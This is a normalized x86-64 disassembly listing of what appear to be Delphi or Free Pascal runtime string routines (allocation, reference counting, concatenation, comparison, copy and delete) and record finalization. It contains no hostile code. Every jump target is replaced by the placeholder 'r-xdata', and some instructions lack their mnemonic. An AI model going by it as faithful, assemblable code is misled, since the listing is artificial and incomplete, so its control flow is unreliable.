mov rcx [ rsp + 0x38 ]
mov edx r13d
xor r8 r8
call sub_408650
test r13d r13d
jle r-xdata
movzx rdi [ rw-data ]
add rsp 0x48
pop rbx
pop rsi
pop rdi
pop r13
retn
mov rcx [ rsp + 0x38 ]
call sub_407780
mov rax [ rsp + 0x38 ]
mov rcx [ rax ]
mov edx r13d
mov r8 rbx
mov r9d esi
movzx eax di
mov [ rsp + 0x20 ] eax
call sub_407900
mov rax [ rsp + 0x38 ]
mov rax [ rax ]
mov [ rax - 0xc ] di
jmp r-xdata
sub_407bd0
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov rbx rcx
mov rsi rdx
mov rdi rsi
test rdi rdi
je r-xdata
mov rax [ rbx ]
mov [ rbp + 0x28 ] rax
mov [ rbx ] rdi
lea rcx [ rbp + 0x28 ]
call sub_407730
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
cmp [ rsi - 0x8 ] 0x0
jge r-xdata
lea rax [ rdi - 0x10 ]
mov ecx 0x1
[ rax + 0x8 ] ecx
mov r13d [ rsi - 0x4 ]
mov ecx r13d
call sub_407620
mov rdi rax
mov rcx rsi
mov rdx rdi
mov r8d r13d
add r8d r8d
movsxd r8 r8d
call sub_404ae0
jmp r-xdata
sub_407c50
sub rsp 0x28
mov r8 rdx
cmp [ rcx ] r8
je r-xdata
add rsp 0x28
retn
test r8 r8
jne r-xdata
mov r9d 0x2
mov eax [ r8 - 0x4 ]
cdq
idiv r9d
test eax eax
jne r-xdata
call sub_4077d0
jmp r-xdata
mov rdx r8
mov r8d eax
call SysReAllocStringLen
test eax eax
jne r-xdata
call sub_4077d0
jmp r-xdata
call sub_407700
sub_407ca0
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov rbx rcx
mov rsi rdx
mov rdi rsi
test rdi rdi
je r-xdata
mov rax [ rbx ]
mov [ rbp + 0x28 ] rax
mov [ rbx ] rdi
lea rcx [ rbp + 0x28 ]
call sub_407780
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
cmp [ rdi - 0x8 ] 0x0
jge r-xdata
lea rax [ rdi - 0x10 ]
mov ecx 0x1
[ rax + 0x8 ] ecx
mov r13d [ rdi - 0x4 ]
mov ecx r13d
movzx rdx [ rdi - 0xc ]
call sub_407680
mov rdi rax
mov rcx rsi
call sub_4084e0
mov rcx rax
mov rdx rdi
movsxd r8 r13d
call sub_404ae0
jmp r-xdata
sub_407d20
push rbp
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov rbx rcx
mov rsi rdx
mov [ rbp + 0x28 ] rsi
cmp [ rbp + 0x28 ] 0x0
je r-xdata
mov rax [ rbx ]
mov [ rbp + 0x28 ] rax
mov [ rbx ] rsi
lea rcx [ rbp + 0x28 ]
call sub_407780
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rbp
retn
mov rcx [ rbp + 0x28 ]
call sub_4078e0
sub_407da0
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rcx
mov rsi [ rbx ]
test rsi rsi
je r-xdata
mov rax rsi
add rsp 0x20
pop rbx
pop rsi
pop rdi
retn
mov rsi [ rbx ]
mov rax [ rbx ]
lea rdi [ rax - 0x10 ]
cmp [ rdi + 0x8 ] 0x1
je r-xdata
mov ecx [ rdi + 0xc ]
call sub_407620
mov rsi rax
mov rcx [ rbx ]
call sub_408900
mov rcx rax
mov rdx rsi
mov r8d [ rdi + 0xc ]
add r8d r8d
movsxd r8 r8d
call sub_404ae0
mov rcx rbx
call sub_407730
mov [ rbx ] rsi
sub_407e00
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rcx
mov rsi [ rbx ]
test rsi rsi
je r-xdata
mov rax rsi
add rsp 0x20
pop rbx
pop rsi
pop rdi
retn
mov rsi [ rbx ]
mov rax [ rbx ]
lea rdi [ rax - 0x10 ]
cmp [ rdi + 0x8 ] 0x1
je r-xdata
mov ecx [ rdi + 0xc ]
movzx rdx [ rdi + 0x4 ]
call sub_407680
mov rsi rax
mov rcx [ rbx ]
call sub_4084e0
mov rcx rax
mov rdx rsi
movsxd r8 [ rdi + 0xc ]
call sub_404ae0
mov rcx rbx
call sub_407780
mov [ rbx ] rsi
sub_407e80
xor rax rax
jmp r-xdata
cmp r8 0x4
jge r-xdata
mov r9d [ rcx ]
cmp r9d [ rdx ]
jne r-xdata
nop
test r8 r8
je r-xdata
cmp r8 0x8
jl r-xdata
retn
movzx rax [ rcx ]
movzx r9 [ rdx ]
sub eax r9d
test eax eax
jne r-xdata
add rcx 0x4
add rdx 0x4
sub r8 0x4
jmp r-xdata
mov r9d [ rcx + 0x4 ]
cmp r9d [ rdx + 0x4 ]
je r-xdata
cmp r8 0x1
je r-xdata
add rcx 0x8
add rdx 0x8
sub r8 0x8
movzx rax [ rcx + 0x1 ]
movzx r9 [ rdx + 0x1 ]
sub eax r9d
test eax eax
jne r-xdata
cmp r8 0x2
je r-xdata
movzx rax [ rcx + 0x2 ]
movzx r9 [ rdx + 0x2 ]
sub eax r9d
test eax eax
jne r-xdata
cmp r8 0x3
je r-xdata
movzx rax [ rcx + 0x3 ]
movzx rcx [ rdx + 0x3 ]
sub eax ecx
sub_407f20
mov rax rcx
mov ecx r9d
movzx r9 [ rdx ]
test r9d r9d
jne r-xdata
test r8d r8d
jg r-xdata
mov [ rax ] 0x0
jmp r-xdata
cmp r8d r9d
jle r-xdata
mov r8d 0x1
jmp r-xdata
retn
sub r9d r8d
add r9d 0x1
test ecx ecx
jge r-xdata
xor rcx rcx
cmp ecx r9d
jle r-xdata
xor rcx rcx
jmp r-xdata
mov [ rax ] cl
mov r9d 0x1
mov r10d ecx
mov ecx r9d
cmp ecx r10d
jg r-xdata
mov ecx r9d
nop
add r10d 0x1
movsxd r9 ecx
mov r11d r8d
add r11d ecx
movsxd r11 r11d
movzx r11 [ rdx + r11 - 0x1 ]
mov [ rax + r9 ] r11b
add ecx 0x1
cmp ecx r10d
jne r-xdata
sub_407fd0
sub rsp 0x28
mov r10 rdx
mov eax r8d
mov rdx r10
jmp r-xdata
test eax eax
jle r-xdata
mov rax r10
neg rax
lea rax [ rdx + rax ]
mov r8d 0x2
cqo
idiv r8
mov rdx r10
mov r8d eax
call sub_407b20
add rsp 0x28
retn
cmp [ rdx ] 0x0
jne r-xdata
sub eax 0x1
add rdx 0x2
sub_408020
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov [ rsp + 0x28 ] rcx
mov rbx rdx
test rbx rbx
je r-xdata
add rsp 0x30
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov rax [ rsp + 0x28 ]
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rsp + 0x28 ]
mov rax [ rax ]
mov esi [ rax - 0x4 ]
mov edi [ rbx - 0x4 ]
mov r13d esi
add r13d edi
mov eax esi
and eax edi
mov ecx r13d
not ecx
mov edx esi
or edx edi
and ecx edx
or eax ecx
test eax 0x80000000
je r-xdata
mov rcx [ rsp + 0x28 ]
mov rdx rbx
call sub_407ca0
jmp r-xdata
mov rcx [ rsp + 0x28 ]
call sub_407e70
mov ecx [ rw-data ]
lea r14 [ rax + rcx - 0x1 ]
mov rax [ rsp + 0x28 ]
mov rax [ rax ]
movzx rax [ rax - 0xc ]
mov rcx [ rsp + 0x28 ]
mov edx r13d
mov r8d eax
call sub_408650
mov eax [ rw-data ]
lea rax [ rbx + rax - 0x1 ]
cmp r14 rax
jne r-xdata
call sub_4050f0
mov eax [ rw-data ]
lea r14 [ rbx + rax - 0x1 ]
mov rcx [ rsp + 0x28 ]
call sub_407e70
mov ecx [ rw-data ]
lea r14 [ rax + rcx - 0x1 ]
jmp r-xdata
mov rcx [ rsp + 0x28 ]
call sub_407e70
mov rcx r14
add esi [ rw-data ]
mov esi esi
lea rdx [ rax + rsi - 0x1 ]
mov r8d edi
call sub_404ae0
sub_408120
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov [ rsp + 0x28 ] rcx
mov rbx rdx
mov rsi r8
test rbx rbx
jne r-xdata
test rsi rsi
jne r-xdata
mov rcx [ rsp + 0x28 ]
mov rdx rsi
call sub_407ca0
jmp r-xdata
mov rax [ rsp + 0x28 ]
cmp [ rax ] rbx
jne r-xdata
mov rcx [ rsp + 0x28 ]
mov rdx rbx
call sub_407ca0
jmp r-xdata
add rsp 0x30
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov rax [ rsp + 0x28 ]
cmp [ rax ] rsi
jne r-xdata
mov rcx [ rsp + 0x28 ]
mov rdx rsi
call sub_408020
jmp r-xdata
mov rcx [ rsp + 0x28 ]
mov rdx rbx
call sub_407ca0
mov rcx [ rsp + 0x28 ]
mov rdx rsi
call sub_408020
mov edi [ rbx - 0x4 ]
mov r13d [ rsi - 0x4 ]
mov r14d edi
add r14d r13d
mov eax edi
and eax r13d
mov ecx r14d
not ecx
mov edx edi
or edx r13d
and ecx edx
or eax ecx
test eax 0x80000000
je r-xdata
movzx rax [ rsi - 0xc ]
mov ecx r14d
mov edx eax
call sub_407680
mov r14 rax
mov rcx rbx
call sub_4084e0
mov rcx rax
mov rdx r14
mov r8d edi
call sub_404ae0
mov rcx rsi
call sub_4084e0
mov rcx rax
mov edi edi
lea rdx [ r14 + rdi ]
mov r8d r13d
call sub_404ae0
mov rcx [ rsp + 0x28 ]
call sub_407780
mov rax [ rsp + 0x28 ]
mov [ rax ] r14
jmp r-xdata
call sub_4050f0
sub_408240
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x40
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x3c ] edx
mov [ rsp + 0x30 ] r8
xor rbx rbx
xor rsi rsi
mov eax [ rsp + 0x3c ]
sub eax 0x1
cmp esi eax
jg r-xdata
nop
xor rax rax
mov [ rsp + 0x3b ] al
xor rdi rdi
xor rsi rsi
mov r13d [ rsp + 0x3c ]
sub r13d 0x1
cmp esi r13d
jg r-xdata
add eax 0x1
nop
movzx rax [ rsp + 0x3b ]
test al al
je r-xdata
add r13d 0x1
add esi 0x1
cmp esi eax
jne r-xdata
movzx rbx [ r14 - 0xc ]
test bx bx
jne r-xdata
mov ecx edi
mov edx ebx
call sub_407680
mov rbx rax
xor rax rax
xor r13 r13
mov rax [ rsp + 0x28 ]
mov rax [ rax ]
mov r13d [ rax - 0x4 ]
mov rcx [ rsp + 0x28 ]
mov edx edi
mov r8d ebx
call sub_408650
mov rax [ rsp + 0x28 ]
mov rbx [ rax ]
mov eax 0x1
jmp r-xdata
add esi 0x1
cmp esi r13d
jne r-xdata
mov rax [ rsp + 0x28 ]
cmp r14 [ rax ]
jne r-xdata
movsxd rcx esi
mov rdx [ rsp + 0x30 ]
mov r14 [ rdx + rcx * 8 ]
test r14 r14
je r-xdata
nop
movzx rax [ rsp + 0x3b ]
test al al
jne r-xdata
add edi 0x1
mov esi eax
mov edi [ rsp + 0x3c ]
sub edi 0x1
cmp esi edi
jg r-xdata
movsxd rax esi
mov rcx [ rsp + 0x30 ]
mov r14 [ rcx + rax * 8 ]
test r14 r14
je r-xdata
add edi [ r14 - 0x4 ]
test edi edi
jge r-xdata
test esi esi
sete al
mov [ rsp + 0x3b ] al
add rsp 0x40
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov rax [ rsp + 0x28 ]
cmp [ rax ] 0x0
je r-xdata
add esi 0x1
cmp esi edi
jne r-xdata
mov rcx r14
movsxd rax r13d
lea rdx [ rbx + rax ]
movsxd r8 [ r14 - 0x4 ]
call sub_404ae0
add r13d [ r14 - 0x4 ]
call sub_4050f0
mov rax [ rsp + 0x28 ]
mov [ rax ] rbx
mov rcx [ rsp + 0x28 ]
call sub_407780
movsxd rax esi
mov rcx [ rsp + 0x30 ]
mov r14 [ rcx + rax * 8 ]
test r14 r14
je r-xdata
sub_4083b0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov [ rbp + 0x50 ] r8
mov [ rbp + 0x58 ] r9
mov [ rbp + 0x40 ] rcx
mov [ rbp + 0x48 ] edx
lea rbx [ rbp + 0x50 ]
mov rcx [ rbp + 0x40 ]
mov edx [ rbp + 0x48 ]
mov r8 rbx
call sub_408240
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_4083f0
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rdx
cmp rcx rbx
jne r-xdata
test rcx rcx
jne r-xdata
xor rax rax
jmp r-xdata
test rbx rbx
jne r-xdata
mov eax [ rbx - 0x4 ]
neg eax
jmp r-xdata
add rsp 0x20
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov edi [ rcx - 0x4 ]
mov r13d [ rbx - 0x4 ]
mov esi edi
cmp esi r13d
jle r-xdata
mov eax [ rcx - 0x4 ]
jmp r-xdata
call sub_4084e0
mov r14 rax
mov rcx rbx
call sub_4084e0
mov rcx rax
test esi esi
jle r-xdata
mov esi r13d
nop
mov eax edi
sub eax r13d
movzx rax [ r14 ]
movzx rdx [ rcx ]
sub eax edx
test eax eax
jne r-xdata
cmp esi 0x1
je r-xdata
movzx rax [ r14 + 0x1 ]
movzx rdx [ rcx + 0x1 ]
sub eax edx
test eax eax
jne r-xdata
add r14 0x2
add rcx 0x2
sub esi 0x2
test esi esi
jg r-xdata
sub_408510
push rbx
sub rsp 0x20
mov rbx rcx
mov eax r8d
xor rcx rcx
test rdx rdx
je r-xdata
cmp eax 0x1
jge r-xdata
mov ecx [ rdx - 0x4 ]
sub eax 0x1
cmp eax ecx
jle r-xdata
xor rax rax
jmp r-xdata
test r9d r9d
jge r-xdata
mov eax ecx
sub ecx eax
cmp ecx r9d
jle r-xdata
xor rcx rcx
jmp r-xdata
test rdx rdx
jne r-xdata
mov ecx r9d
mov r8 rbx
movsxd rax eax
lea rax [ rdx + rax ]
mov r9d ecx
movzx r10 [ rdx - 0xc ]
mov rcx r8
mov rdx rax
mov r8d r9d
mov r9d r10d
call sub_407a00
mov rcx rbx
call sub_407780
jmp r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_408590
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov [ rsp + 0x28 ] rcx
mov ebx edx
mov esi r8d
mov rcx [ rsp + 0x28 ]
call sub_407e00
mov rax [ rsp + 0x28 ]
cmp [ rax ] 0x0
je r-xdata
add rsp 0x30
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov rax [ rsp + 0x28 ]
mov rax [ rax ]
mov edi [ rax - 0x4 ]
cmp ebx 0x1
jl r-xdata
cmp ebx edi
jg r-xdata
test esi esi
jle r-xdata
mov r13d edi
sub r13d ebx
add r13d 0x1
cmp esi r13d
jle r-xdata
mov rcx [ rsp + 0x28 ]
call sub_407e70
mov r14 rax
mov rcx [ rsp + 0x28 ]
call sub_407e70
mov ecx ebx
add ecx esi
movsxd rcx ecx
lea rcx [ r14 + rcx - 0x1 ]
movsxd rbx ebx
lea rdx [ rax + rbx - 0x1 ]
mov r8d r13d
sub r8d esi
movsxd r8 r8d
call sub_404ae0
mov rax [ rsp + 0x28 ]
mov rax [ rax ]
movzx rax [ rax - 0xc ]
mov rcx [ rsp + 0x28 ]
mov edx edi
sub edx esi
mov r8d eax
call sub_408650
mov esi r13d
sub_408650
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov rbx rcx
mov esi edx
test esi esi
jg r-xdata
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_407780
jmp r-xdata
mov ecx esi
mov edx r8d
call sub_407680
mov rdi rax
cmp [ rbx ] 0x0
jne r-xdata
mov rax [ rbx ]
mov eax [ rax - 0x8 ]
cmp eax 0x1
jne r-xdata
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov rax [ rbx ]
mov r13d [ rax - 0x4 ]
cmp r13d esi
jle r-xdata
mov [ rbx ] rdi
jmp r-xdata
mov rax [ rbx ]
lea rax [ rax - 0x10 ]
mov [ rbp + 0x28 ] rax
lea rcx [ rbp + 0x28 ]
mov edx esi
add edx 0x11
movsxd rdx edx
call sub_4047e0
mov rax [ rbp + 0x28 ]
mov [ rax + 0xc ] esi
mov rax [ rbp + 0x28 ]
lea rax [ rax + 0x10 ]
mov [ rbx ] rax
mov rcx [ rbx ]
call sub_4084e0
movsxd rsi esi
mov [ rax + rsi ] 0x0
jmp r-xdata
mov rcx [ rbx ]
call sub_4084e0
mov rcx rax
mov rdx rdi
movsxd r8 r13d
call sub_404ae0
mov rcx rbx
call sub_407780
mov [ rbx ] rdi
mov r13d esi
sub_408720
sub rsp 0x28
test rdx rdx
jne r-xdata
mov rax rdx
mov r9d [ rdx - 0x4 ]
mov r10d r8d
mov rdx rax
mov r8d r9d
mov r9d r10d
call sub_407b20
call sub_407780
jmp r-xdata
add rsp 0x28
retn
sub_408750
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x40
mov [ rsp + 0x28 ] rcx
mov ebx edx
mov [ rsp + 0x30 ] r8
xor rax rax
mov [ rsp + 0x3f ] al
xor r13 r13
xor rsi rsi
mov edi ebx
sub edi 0x1
cmp esi edi
jg r-xdata
nop
movzx rax [ rsp + 0x3f ]
test al al
je r-xdata
add edi 0x1
mov ecx r13d
call sub_407620
mov r13 rax
xor rax rax
xor rdi rdi
mov rax [ rsp + 0x28 ]
mov rax [ rax ]
mov edi [ rax - 0x4 ]
mov rcx [ rsp + 0x28 ]
mov edx r13d
call sub_408980
mov rax [ rsp + 0x28 ]
mov r13 [ rax ]
mov eax 0x1
jmp r-xdata
add esi 0x1
cmp esi edi
jne r-xdata
mov rax [ rsp + 0x28 ]
cmp r14 [ rax ]
jne r-xdata
nop
movzx rax [ rsp + 0x3f ]
test al al
jne r-xdata
add ebx 0x1
mov esi eax
sub ebx 0x1
cmp esi ebx
jg r-xdata
movsxd rax esi
mov rcx [ rsp + 0x30 ]
mov r14 [ rcx + rax * 8 ]
test r14 r14
je r-xdata
add r13d [ r14 - 0x4 ]
test r13d r13d
jge r-xdata
test esi esi
sete al
mov [ rsp + 0x3f ] al
add rsp 0x40
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov rax [ rsp + 0x28 ]
cmp [ rax ] 0x0
je r-xdata
add esi 0x1
cmp esi ebx
jne r-xdata
mov rcx r14
movsxd rax edi
lea rdx [ r13 + rax * 2 ]
mov r8d [ r14 - 0x4 ]
add r8d r8d
movsxd r8 r8d
call sub_404ae0
add edi [ r14 - 0x4 ]
call sub_4050f0
mov rax [ rsp + 0x28 ]
mov [ rax ] r13
mov rcx [ rsp + 0x28 ]
call sub_407730
movsxd rax esi
mov rcx [ rsp + 0x30 ]
mov r14 [ rcx + rax * 8 ]
test r14 r14
je r-xdata
sub_408880
push rbp
push rsi
push rbx
sub rsp 0x120
mov rbp rsp
mov rbx rcx
mov esi r8d
mov [ rbp + 0x148 ] dx
cmp esi 0xff
jle r-xdata
lea rcx [ rbp + 0x20 ]
mov edx 0xff
lea r8 [ rbp + 0x148 ]
mov r9d 0x1
call sub_407950
test eax eax
jge r-xdata
mov esi 0xff
cmp eax esi
jle r-xdata
xor rax rax
jmp r-xdata
mov [ rbx ] al
test eax eax
jle r-xdata
mov eax esi
lea rsp [ rbp + 0x120 ]
pop rbx
pop rsi
pop rbp
retn
lea rcx [ rbp + 0x20 ]
lea rdx [ rbx + 0x1 ]
movsxd r8 eax
call sub_404ae0
sub_408980
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov rbx rcx
mov esi edx
test esi esi
jg r-xdata
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_407730
jmp r-xdata
mov ecx esi
call sub_407620
mov rdi rax
cmp [ rbx ] 0x0
je r-xdata
mov rax [ rbx ]
mov eax [ rax - 0x8 ]
cmp eax 0x1
jne r-xdata
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov [ rbx ] rdi
mov rax [ rbx ]
mov r13d [ rax - 0x4 ]
cmp r13d esi
jle r-xdata
mov rax [ rbx ]
lea rax [ rax - 0x10 ]
mov [ rbp + 0x28 ] rax
cmp esi 0x7ffffff7
jb r-xdata
mov rcx [ rbx ]
call sub_408900
mov rcx rax
mov rdx rdi
mov r8d r13d
add r8d r8d
movsxd r8 r8d
call sub_404ae0
mov rcx rbx
call sub_407730
mov r13d esi
lea rcx [ rbp + 0x28 ]
mov edx esi
add edx 0x1
add edx edx
add edx 0x10
movsxd rdx edx
call sub_4047e0
mov rax [ rbp + 0x28 ]
mov [ rax + 0xc ] esi
mov rax [ rbp + 0x28 ]
lea rax [ rax + 0x10 ]
mov [ rbx ] rax
mov rcx [ rbx ]
call sub_408900
movsxd rsi esi
mov [ rax + rsi * 2 ] 0x0
jmp r-xdata
call sub_4050f0
sub_408a60
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov [ rsp + 0x28 ] rcx
mov rbx rdx
test rbx rbx
je r-xdata
add rsp 0x30
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov rax [ rsp + 0x28 ]
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rsp + 0x28 ]
mov rax [ rax ]
mov esi [ rax - 0x4 ]
mov edi [ rbx - 0x4 ]
mov r13d esi
add r13d edi
mov eax r13d
test eax 0xc0000000
je r-xdata
mov rcx [ rsp + 0x28 ]
mov rdx rbx
call sub_407bd0
jmp r-xdata
mov rcx [ rsp + 0x28 ]
call sub_407e60
mov ecx [ rw-data ]
lea r14 [ rax + rcx * 2 - 0x2 ]
mov rcx [ rsp + 0x28 ]
mov edx r13d
call sub_408980
mov eax [ rw-data ]
lea rax [ rbx + rax * 2 - 0x2 ]
cmp r14 rax
jne r-xdata
call sub_4050f0
mov eax [ rw-data ]
lea r14 [ rbx + rax * 2 - 0x2 ]
mov rcx [ rsp + 0x28 ]
call sub_407e60
mov ecx [ rw-data ]
lea r14 [ rax + rcx * 2 - 0x2 ]
jmp r-xdata
mov rcx [ rsp + 0x28 ]
call sub_407e60
mov rcx r14
add esi [ rw-data ]
mov esi esi
lea rdx [ rax + rsi * 2 - 0x2 ]
mov r8d edi
add r8d r8d
mov r8d r8d
call sub_404ae0
sub_408b50
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov [ rbp + 0x50 ] r8
mov [ rbp + 0x58 ] r9
mov [ rbp + 0x40 ] rcx
mov [ rbp + 0x48 ] edx
lea rbx [ rbp + 0x50 ]
mov rcx [ rbp + 0x40 ]
mov edx [ rbp + 0x48 ]
mov r8 rbx
call sub_408750
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_408b90
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rdx
cmp rcx rbx
jne r-xdata
test rcx rcx
jne r-xdata
xor rax rax
jmp r-xdata
test rbx rbx
jne r-xdata
mov eax [ rbx - 0x4 ]
neg eax
jmp r-xdata
add rsp 0x20
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov edi [ rcx - 0x4 ]
mov r13d [ rbx - 0x4 ]
mov esi edi
cmp esi r13d
jle r-xdata
mov eax [ rcx - 0x4 ]
jmp r-xdata
call sub_408900
mov r14 rax
mov rcx rbx
call sub_408900
mov rcx rax
test esi esi
jle r-xdata
mov esi r13d
nop
mov eax edi
sub eax r13d
movzx eax [ r14 ]
movzx edx [ rcx ]
sub eax edx
test eax eax
jne r-xdata
cmp esi 0x1
je r-xdata
movzx eax [ r14 + 0x2 ]
movzx edx [ rcx + 0x2 ]
sub eax edx
test eax eax
jne r-xdata
add r14 0x4
add rcx 0x4
sub esi 0x2
test esi esi
jg r-xdata
sub_408c40
push rbx
sub rsp 0x20
mov rbx rcx
mov eax r8d
xor rcx rcx
test rdx rdx
je r-xdata
cmp eax 0x1
jge r-xdata
mov ecx [ rdx - 0x4 ]
sub eax 0x1
cmp eax ecx
jle r-xdata
xor rax rax
jmp r-xdata
test r9d r9d
jge r-xdata
mov eax ecx
sub ecx eax
cmp ecx r9d
jle r-xdata
xor rcx rcx
jmp r-xdata
mov r8 rbx
movsxd rax eax
lea rdx [ rdx + rax * 2 ]
mov eax ecx
mov rcx r8
mov r8d eax
call sub_4079a0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov ecx r9d
sub_408ca0
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rcx
mov esi edx
mov edi r8d
mov rcx rbx
call sub_407da0
mov rax [ rbx ]
xor rcx rcx
test rax rax
je r-xdata
mov eax ecx
cmp esi 0x1
jl r-xdata
mov ecx [ rax - 0x4 ]
add rsp 0x20
pop rbx
pop rsi
pop rdi
retn
cmp esi eax
jg r-xdata
test edi edi
jle r-xdata
sub esi 0x1
mov ecx eax
sub ecx esi
sub ecx edi
mov edi ecx
test edi edi
jge r-xdata
mov rcx [ rbx ]
sub eax edi
movsxd rax eax
lea rcx [ rcx + rax * 2 ]
mov rax [ rbx ]
movsxd rdx esi
lea rdx [ rax + rdx * 2 ]
mov r8d edi
add r8d r8d
movsxd r8 r8d
call sub_404ae0
mov rcx rbx
mov edx esi
add edx edi
call sub_408980
xor rdi rdi
sub_408d20
push rsi
push rbx
movzx r9 [ rcx ]
movzx rax [ rdx ]
sub eax r8d
sub eax r9d
add eax 0x1
test r8d r8d
jle r-xdata
xor rax rax
test eax eax
jl r-xdata
test r9d r9d
jle r-xdata
lea r10 [ rcx + 0x1 ]
lea rdx [ rdx + 0x1 ]
mov ecx r8d
sub ecx 0x1
movsxd rcx ecx
add rdx rcx
xor rcx rcx
mov r11d eax
mov eax ecx
cmp eax r11d
jg r-xdata
nop
add r11d 0x1
test ecx ecx
jl r-xdata
cmp ecx r9d
jl r-xdata
cmp ecx r9d
jl r-xdata
add eax 0x1
cmp eax r11d
jne r-xdata
add eax r8d
jmp r-xdata
mov ebx eax
add ebx ecx
movsxd rbx ebx
movsxd rsi ecx
movzx rbx [ rdx + rbx ]
cmp bl [ r10 + rsi ]
jne r-xdata
xor rcx rcx
jmp r-xdata
pop rbx
pop rsi
retn
or ecx 0xffffffff
add ecx 0x1
jmp r-xdata
sub_408db0
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rdx
mov esi r8d
xor r13 r13
test rcx rcx
je r-xdata
xor rax rax
test rbx rbx
je r-xdata
mov r13d [ rcx - 0x4 ]
mov edi eax
sub edi esi
sub edi r13d
add edi 0x1
test esi esi
jle r-xdata
mov eax [ rbx - 0x4 ]
xor rax rax
test edi edi
jl r-xdata
test r13d r13d
jle r-xdata
call sub_408900
mov r14 rax
mov rcx rbx
call sub_408900
mov rdx rax
mov eax esi
sub eax 0x1
movsxd rax eax
add rax rax
add rdx rax
xor rax rax
cmp eax edi
jg r-xdata
nop
add edi 0x1
test ecx ecx
jl r-xdata
cmp ecx r13d
jl r-xdata
cmp ecx r13d
jl r-xdata
add eax 0x1
cmp eax edi
jne r-xdata
add eax esi
jmp r-xdata
mov r8d eax
add r8d ecx
movsxd r8 r8d
movsxd r9 ecx
movzx r8 [ rdx + r8 * 2 ]
cmp r8w [ r14 + r9 * 2 ]
jne r-xdata
xor rcx rcx
jmp r-xdata
add rsp 0x20
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
or ecx 0xffffffff
add ecx 0x1
jmp r-xdata
sub_408e70
push r13
push rdi
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
movzx rax [ rdx + 0x1 ]
lea rsi [ rdx + rax ]
cmp [ rsi + 0x6 ] 0x0
jbe r-xdata
mov rax rbx
add rsp 0x28
pop rbx
pop rsi
pop rdi
pop r13
retn
xor rdi rdi
mov r13d [ rsi + 0x6 ]
sub r13d 0x1
cmp edi r13d
ja r-xdata
nop
add r13d 0x1
mov eax edi
add rax rax
mov eax [ rsi + rax * 8 + 0x12 ]
lea rcx [ rbx + rax ]
mov eax edi
add rax rax
mov rax [ rsi + rax * 8 + 0xa ]
mov rdx [ rax ]
mov r8d 0x1
call sub_408f10
add edi 0x1
cmp edi r13d
jne r-xdata
sub_408f10
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rcx
mov rsi rdx
mov rdi r8
mov r13 rbx
test rdi rdi
je r-xdata
mov rax r13
add rsp 0x20
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
movzx rax [ rsi ]
cmp rax 0xe
jg r-xdata
sub rax 0xf
test rax rax
je r-xdata
cmp rax 0xe
je r-xdata
test rdi rdi
ja r-xdata
sub rax 0x2
test rax rax
je r-xdata
movzx rax [ rsi + 0x1 ]
lea r14 [ rsi + rax ]
jmp r-xdata
sub rax 0xa
test rax rax
je r-xdata
mov rcx rbx
call sub_409ca0
add rbx 0x8
sub rdi 0x1
jmp r-xdata
test rdi rdi
ja r-xdata
sub rax 0x1
test rax rax
jne r-xdata
test rdi rdi
ja r-xdata
mov rcx rbx
mov edx edi
call sub_407840
jmp r-xdata
sub rax 0x1
test rax rax
je r-xdata
mov rcx rbx
mov rdx rsi
call sub_409890
add rbx 0x8
sub rdi 0x1
jmp r-xdata
mov cl 0x2
call sub_404a90
jmp r-xdata
mov rcx rbx
mov rdx rsi
call sub_408e70
mov eax [ r14 + 0x2 ]
add rbx rax
sub rdi 0x1
jmp r-xdata
mov rcx rbx
mov edx edi
call sub_407870
jmp r-xdata
sub rax 0x1
test rax rax
je r-xdata
mov rcx rbx
mov edx edi
call sub_407810
jmp r-xdata
test rdi rdi
ja r-xdata
sub rax 0x1
test rax rax
jne r-xdata
mov rcx rbx
call sub_408ee0
add rbx 0x18
sub rdi 0x1
